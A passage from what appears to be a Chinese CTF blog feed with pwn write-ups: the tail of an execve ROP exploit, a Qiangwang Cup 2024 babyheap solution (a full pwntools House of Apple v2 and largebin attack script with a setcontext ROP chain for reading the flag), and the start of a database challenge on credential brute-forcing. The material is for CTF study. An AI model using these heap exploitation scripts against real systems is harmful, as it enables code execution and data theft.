class="number">0x000000000001FC60</span></span><br><span class="line">pop_rcx = elf.address + <span class="number">0x0000000000017FFF</span></span><br><span class="line">ret = elf.address + <span class="number">0x0000000000016BD8</span></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">payload += p64(pop_rdi_rbp) + p64(ret_addr + <span class="number">0x60</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_rbp) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rcx) + p64(<span class="number">0x33</span>)</span><br><span class="line">payload += p64(sub_rdx_rcx_add_rax_rcx)</span><br><span class="line">payload += p64(pop_rax) + p64(constants.SYS_execve)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line">payload += <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line"></span><br><span class="line">arb_write(ret_addr, payload)</span><br><span class="line">quit()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;题目分析&lt;/h1&gt;
&lt;p&gt;到手之后是一个扣了符号的rust程序，非常的恶心。&lt;/p&gt;
&lt;h1&gt;最后看看出题人的分享&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://bbs.kanxue.com/thread-284240.htm&quot;&gt;https:</summary>
      
    
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="逆向" scheme="https://zjw1nd.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="heap" scheme="https://zjw1nd.github.io/tags/heap/"/>
    
    <category term="rust" scheme="https://zjw1nd.github.io/tags/rust/"/>
    
  </entry>
  
  <entry>
    <title>How2Heap实战——强网杯2024babyheap</title>
    <link href="https://zjw1nd.github.io/2024/11/10/How2Heap%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E5%BC%BA%E7%BD%91%E6%9D%AF2024babyheap/"/>
    <id>https://zjw1nd.github.io/2024/11/10/How2Heap%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E5%BC%BA%E7%BD%91%E6%9D%AF2024babyheap/</id>
    <published>2024-11-10T15:55:14.000Z</published>
    <updated>2024-11-15T09:44:47.966Z</updated>
    
    <content type="html"><![CDATA[<h1>题目分析</h1><p>这个题目给了相当多的check：</p><ul class="lvl-0"><li class="lvl-2">沙箱ban了open，openat和execve，glibc 2.35, 释放有UAF, chunk只能分配0x500-0x5FF大小，其余大小都会变成0x500，最多5个，只有一次edit一次show。</li><li class="lvl-2">程序开始会把IO_wfile_jumps向后的page全写0</li><li class="lvl-2">同时允许一个经过check的地址写16字节，check不允许写stdin到stdin向后0x1b000，以及stdin-1C67F700往前（非libc段不让写）</li><li class="lvl-2">另外提供了一个接口，允许查询USER环境变量或者将其修改为“flag?&quot;，只能用一次。</li><li class="lvl-2">Largebin attack会用完5个块，同时也会用掉唯一一次UAF edit。后续没有办法再次控制chunk内容</li><li class="lvl-2">而且题目提供的任意地址写无法写glibc前面（也就是堆）地址，同时也没法直接写已经打开的IO（0-2和IOlistall都不行）</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">change_user_env</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( flag_only_once )</span><br><span class="line">  &#123;</span><br><span class="line">    my_print((__int64)<span class="string">&quot;What ! Are you kidding me ? \n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  flag_only_once = <span class="number">1</span>;</span><br><span class="line">  my_print((__int64)<span class="string">&quot;What do you want from the environment ? \n&quot;</span>);</span><br><span class="line">  my_print((__int64)<span class="string">&quot;Maybe you will be sad !\n&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    setenv(<span class="string">&quot;USER&quot;</span>, <span class="string">&quot;flag?&quot;</span>, <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt; <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      cur_user();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v1 != <span class="number">2</span> )</span><br><span class="line">LABEL_11:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      putenv(<span class="string">&quot;USER=flag?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">check_addr</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">stdin</span> &lt;= buf &amp;&amp; &amp;<span class="built_in">stdin</span>[<span class="number">512</span>] &gt; buf )      <span class="comment">// 不允许写012和iolistall</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  result = buf;</span><br><span class="line">  <span class="keyword">if</span> ( &amp;<span class="built_in">stdin</span>[<span class="number">-0x21AAA0</span>u] &gt; buf )               <span class="comment">// 不允许写heap和程序本身</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> result;                                <span class="comment">// 其他的libc都可以改...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种情况下我们该怎么攻击？下面介绍几种通过这个题其他队伍解出来的wp获得的思路，感觉下面这些再不通就没什么太多别的思路了。</p><h1>思路？</h1><h2 id="IO-wfile-jumps-mmap与House-of-apple">_IO_wfile_jumps_mmap与House of apple</h2><p>在house_of_apple v2中，劫持控制流依靠的是<code>IO_wfile_overflow</code>函数，利用了对这部分vtable没有检查的特性。但其实这个函数存在于三个虚表中，包括<code>IO_wfile_jumps</code>，<code>io_wfile_jumps_mmap</code>以及<code>io_wfile_jumps_maybe_mmap</code>。这道题其实没有控制<code>IO_wfile_jumps_maybe_mmap</code>，因此其实我们还是能用house of apple。</p><p>在pwndbg中确定<code>io_wfile_overflow</code>的地址后利用search pointer可以看到：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -t pointer 0x7ffff7de1390</span><br><span class="line">Searching <span class="keyword">for</span> value: b<span class="string">&#x27;\x90\x13\xde\xf7\xff\x7f\x00\x00&#x27;</span></span><br><span class="line">libc-2.35.so    0x7ffff7f71f58 0x7ffff7de1390 <span class="comment"># offset: 0x216f58</span></span><br><span class="line">libc-2.35.so    0x7ffff7f72018 0x7ffff7de1390 <span class="comment"># offset: 0x217018</span></span><br><span class="line"><span class="comment"># io_wfile_jumps: offset: 0x2170c0</span></span><br></pre></td></tr></table></figure><p>尽管io_wile_jumps被写0了，我们还是有2个虚表存了这个函数。在IDA中看了下，这两个表libc都没有给符号，但是都在io_wfile_jumps上面一点点所以利用应该也是比较简单。我们把本来写<code>IO_wfile_jumps</code>的地方写成<code>IO_wfile_Jumps-0xc0</code>就行了。</p><p>5个块够发起一次largebin attack了，所以下面附上笔者自己复现的思路，同时顺手总结一下通解板子希望下次能快点。有空抽出来单发一篇blog</p><h3 id="拆解步骤-House-of-apple-v2解决沙箱堆">拆解步骤-House of apple v2解决沙箱堆</h3><p>上次ciscn的那道题复现细节太多了，没有很好地整体把握，有点机械的对着exp解释代码，这次勤来看这篇应该不会有太大问题了。</p><ol><li class="lvl-3"><p>确定漏洞点，我们是否能有一次largebin attack的机会？是不是能UAF控制largebin的内容？如果是，那这题只需要绕过题目的限制就结束了</p></li><li class="lvl-3"><p>我们都知道House of apple的链条，下面具体说一下<br>House of Apple-v2是一系列利用高版本libc下不对IO_file_complete中处理宽字符流的_wide_data的vtable做检查的特性实现的攻击手段。具体思想是伪造io_file，然后有两步的跳转：</p></li></ol><ul class="lvl-0"><li class="lvl-4"><p>伪造wide_data指向一个可控地址，wide_data也是类似于一个IO_file的结构体</p></li><li class="lvl-4"><p>控制wide_data的vtable字段，让vtable指向可控地址</p></li><li class="lvl-4"><p>vtable+0x68写为我们要跳转的地方（exit的时候调用的io_wfile_overflow）</p></li></ul><ol start="3"><li class="lvl-3"><p>没有沙箱这里就可以使用one_gadget等手段了，有沙箱就涉及到栈迁移+ROP或ret2sc的思想</p></li></ol><p>我们利用setcontext+61(glibc 2.29前是setcontext+53并且能用rdi控制)这个gadget，在rdx+0xa0写入fakestack的地址，在rdx+0xa8写入第一条ROP指令起点（写个ret就行）注意要观察跳入setcontext的时候rdx或者rdi寄存器的内容。比如如果低于2.34的版本可以打free_hook然后rdi会是我们的fakeio地址。这道题是直接通过exit退出，调试发现跳入setcontext的时候rdx就是wide_data的地址</p><p>后面就可以执行我们的ROP链了。</p><h3 id="exp（板子和思路重要）">exp（板子和思路重要）</h3><p>对于涉及来回偏移，overlap复用空间等等操作来说，pwntools的<code>FileStructure()</code>就不那么好用了，可以参考自己写的下面这个带有偏移的板子来构造，单一chunk包含所有信息：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p64,u64</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">context.log_level=<span class="string">&#x27;info&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">libc=elf.libc</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = gdb.debug(&quot;./pwn&quot;)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Enter your choice: \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Enter your commodity size \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Enter your choice: \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Enter which to delete: \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Enter your choice: \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Enter which to edit: \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input the content \n&#x27;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Enter your choice: \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Enter which to show: \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret</span>(<span class="params">buf, content</span>):</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Enter your choice: \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input your target addr \n&#x27;</span>)</span><br><span class="line">p.send(buf)</span><br><span class="line">p.send(content)</span><br><span class="line"><span class="comment">### largebin attack 预备</span></span><br><span class="line"><span class="comment"># 沙箱堆风水不影响large</span></span><br><span class="line">add(<span class="number">0x520</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x520</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x510</span>) <span class="comment"># 3</span></span><br><span class="line">delete(<span class="number">1</span>) <span class="comment"># 1 in unsorted</span></span><br><span class="line">add(<span class="number">0x530</span>) <span class="comment"># 4, 1 in largebin，3&lt;1，我们等会用来触发攻击</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># ---------------leak---------------</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;The content is here \n&#x27;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x21b110</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] libc_base: &quot;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line">libc.address = libc_base</span><br><span class="line"></span><br><span class="line">IO_list_all = libc_base + <span class="number">0x21b680</span></span><br><span class="line">rtld_global = libc_base + <span class="number">0x29c040</span></span><br><span class="line">link_map = libc_base + <span class="number">0x29d2e0</span></span><br><span class="line">setcontext = libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">61</span></span><br><span class="line">mprotect = libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">8</span>))-<span class="number">0x1950</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] heap_base: &quot;</span>, <span class="built_in">hex</span>(heap_base))</span><br><span class="line"><span class="comment"># ---------------leak---------------</span></span><br><span class="line"><span class="comment">### -----------orw ROP chain using openat2: 基于glibc2.35, 再碰见2.35的或许可以直接套--------------</span></span><br><span class="line">ret = libc_base+<span class="number">0x2a3e6</span></span><br><span class="line">pop_rdi=libc_base+<span class="number">0x2a3e5</span></span><br><span class="line">pop_rsi=libc_base+<span class="number">0x2be51</span></span><br><span class="line">pop_rdx_rbx=libc_base+<span class="number">0x904a9</span></span><br><span class="line">pop_rax=libc_base+<span class="number">0x45eb0</span></span><br><span class="line">pop_rcx=libc_base+<span class="number">0x3d1ee</span></span><br><span class="line">pop_r8=libc_base+<span class="number">0x1659e6</span></span><br><span class="line">syscall=libc_base+<span class="number">0x91316</span></span><br><span class="line">flag_addr=heap_base+<span class="number">0x1950</span>+<span class="number">0x100</span> <span class="comment"># 随便换</span></span><br><span class="line">payload=p64(pop_rdi)+p64(<span class="number">437</span>)+p64(pop_rsi)+p64(<span class="number">0xffffffffffffff9c</span>)+p64(pop_rdx_rbx)+p64(flag_addr)+p64(<span class="number">0</span>)+p64(pop_rcx)+p64(heap_base+<span class="number">0x100</span>)+p64(pop_r8)+p64(<span class="number">24</span>)+p64(libc.sym[<span class="string">&quot;syscall&quot;</span>]) <span class="comment"># openat2，这里换open也行</span></span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">0x3</span>)+p64(pop_rsi)+p64(heap_base)+p64(pop_rdx_rbx)+p64(<span class="number">0x30</span>)+p64(<span class="number">0</span>)+p64(libc.sym[<span class="string">&quot;read&quot;</span>]) <span class="comment"># read</span></span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(libc.sym[<span class="string">&quot;write&quot;</span>]) <span class="comment"># write</span></span><br><span class="line">fake_stack=heap_base+<span class="number">0x1950</span>+<span class="number">0x200</span> <span class="comment"># 固定</span></span><br><span class="line"><span class="comment"># 确定flag的地址 填到flag里</span></span><br><span class="line"><span class="comment">### ---------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">### ↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓重要↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓</span></span><br><span class="line"><span class="comment"># 下面的-0x10是因为edit写入是从内容开始写，而io_list_all到时候会被改成带有元数据的起始地址，-0x10</span></span><br><span class="line"><span class="comment"># 写成这样是更方便理解</span></span><br><span class="line">fs_wdata = fit( <span class="comment"># overlap 等于wide_vtable和wide_data在一起</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment"># 前4字段，为了让我们能取回这个块，保留好</span></span><br><span class="line">        <span class="number">0x0</span>:p64(libc_base+<span class="number">0x21b110</span>), <span class="comment"># 0x520的bin地址</span></span><br><span class="line"><span class="number">0x8</span>:p64(libc_base+<span class="number">0x21b110</span>),</span><br><span class="line"><span class="number">0x10</span>:p64(heap_base+<span class="number">0x1950</span>), <span class="comment"># self</span></span><br><span class="line"><span class="number">0x18</span>: p64(IO_list_all-<span class="number">0x20</span>), <span class="comment"># target-0x20</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0xa0</span>-<span class="number">0x10</span>: heap_base+<span class="number">0x1950</span>+<span class="number">0x100</span>, <span class="comment"># wide_data 指向自己+0x100</span></span><br><span class="line">        <span class="number">0xd8</span>-<span class="number">0x10</span>: libc.sym._IO_wfile_jumps-<span class="number">0xc0</span>,</span><br><span class="line"><span class="comment"># wide_data+wide_vtable:</span></span><br><span class="line">        <span class="number">0x0</span>+<span class="number">0x100</span>-<span class="number">0x10</span>: <span class="string">b&quot;flag&quot;</span>.ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>), <span class="comment"># 随便填的</span></span><br><span class="line">        <span class="number">0x18</span>+<span class="number">0x100</span>-<span class="number">0x10</span>: p64(<span class="number">0x0</span>), <span class="comment"># apple v2的要求</span></span><br><span class="line">        <span class="number">0x30</span>+<span class="number">0x100</span>-<span class="number">0x10</span>: p64(<span class="number">0x0</span>), <span class="comment"># apple v2的要求</span></span><br><span class="line">        <span class="number">0x68</span>+<span class="number">0x100</span>-<span class="number">0x10</span>: p64(setcontext),  <span class="comment"># _wide_vtable -&gt; wdoallocate的位置 控制流触发</span></span><br><span class="line"><span class="comment">## setcontext所需要的参数：</span></span><br><span class="line">        <span class="number">0xa0</span>+<span class="number">0x100</span>-<span class="number">0x10</span>: p64(fake_stack),</span><br><span class="line">        <span class="number">0xa8</span>+<span class="number">0x100</span>-<span class="number">0x10</span>: p64(ret), <span class="comment"># mov rdx+0xa8, push rcx, 返回地址</span></span><br><span class="line">        <span class="comment">## _wide_data-&gt;_wide_vtable 指向自己+0x100,和widedata平齐</span></span><br><span class="line">        <span class="number">0xE0</span>+<span class="number">0x100</span>-<span class="number">0x10</span>: heap_base+<span class="number">0x1950</span>+<span class="number">0x100</span>, </span><br><span class="line"><span class="comment"># ropchain/fake stack:</span></span><br><span class="line">        <span class="number">0x200</span>-<span class="number">0x10</span>: payload <span class="comment"># 换shellcode也行，那么上面0xa8就要写这里的地址了</span></span><br><span class="line">    &#125;,</span><br><span class="line">    filler=<span class="string">b&quot;\x00&quot;</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+]_IO_list_all: <span class="subst">&#123;fs_wdata&#125;</span>&quot;</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">1</span>,fs_wdata)</span><br><span class="line">add(<span class="number">0x550</span>) <span class="comment"># 4, largebin attack</span></span><br><span class="line">add(<span class="number">0x508</span>) <span class="comment"># 5，取出刚刚的chunk3，让target写入chunk1的地址</span></span><br><span class="line">gdb.attach(p,<span class="string">&quot;b * setcontext+61&quot;</span>)</span><br><span class="line">add(<span class="number">0x550</span>) <span class="comment"># 6 超出上限，用于触发exit的操作</span></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># exit-&gt;fcloseall(__flcloseall)-&gt;IO_cleanup-&gt;_IO_flush_all_lockp</span></span><br></pre></td></tr></table></figure><h2 id="tls-dtor-lists">tls_dtor_lists</h2><p>利用程序ld段进行攻击。</p><h2 id="libc-got-疑似预期解">libc got-疑似预期解</h2><blockquote></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;题目分析&lt;/h1&gt;
&lt;p&gt;这个题目给了相当多的check：&lt;/p&gt;
&lt;ul class=&quot;lvl-0&quot;&gt;
&lt;li class=&quot;lvl-2&quot;&gt;沙箱ban了open，openat和execve，glibc 2.35, 释放有UAF, chunk只能分配0x500-0x5FF</summary>
      
    
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="wp" scheme="https://zjw1nd.github.io/tags/wp/"/>
    
    <category term="heap" scheme="https://zjw1nd.github.io/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>How2Heap实战——网鼎杯database wp</title>
    <link href="https://zjw1nd.github.io/2024/11/10/How2Heap%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E7%BD%91%E9%BC%8E%E6%9D%AFdatabase-wp/"/>
    <id>https://zjw1nd.github.io/2024/11/10/How2Heap%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E7%BD%91%E9%BC%8E%E6%9D%AFdatabase-wp/</id>
    <published>2024-11-10T15:29:18.000Z</published>
    <updated>2024-11-14T11:57:33.270Z</updated>
    
    <content type="html"><![CDATA[<h1>题目分析</h1><p>Glibc2.27，64位保护全开，沙箱ban掉了execve和execveat，打orw。</p><h2 id="爆破用户名和密码">爆破用户名和密码</h2><p>这个程序上来先在远程打开了用户名和密码的文件要我们输入，找了半天没找到题目里能有什么提示，还是当时队里做逆向的师傅搞定的。观察发现，函数比较输入的逻辑比较奇怪。先调用了一个自己实现的strcmp，这里对我们的用户输入调用了strlen，然后按照用户输入的长度去比较：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">my_strcmp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, <span class="type">char</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v4; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1[i] != a2[i] )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>中间有不一样的就返回“Invalid username”，而如果全一样再去比较用户输入和指定用户名/密码的长度，不一样再输出&quot;Invalid password&quot;.这两种不同的回显加上源程序死循环调用的特性，让我们可以轻易的利用这一点去对用户名和密码进行爆破</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hello, Welcome to the Security Database. Login first!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Input your username:&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x11</span>uLL);</span><br><span class="line">    input(<span class="number">0</span>, s, <span class="number">0x10</span>uLL);</span><br><span class="line">    <span 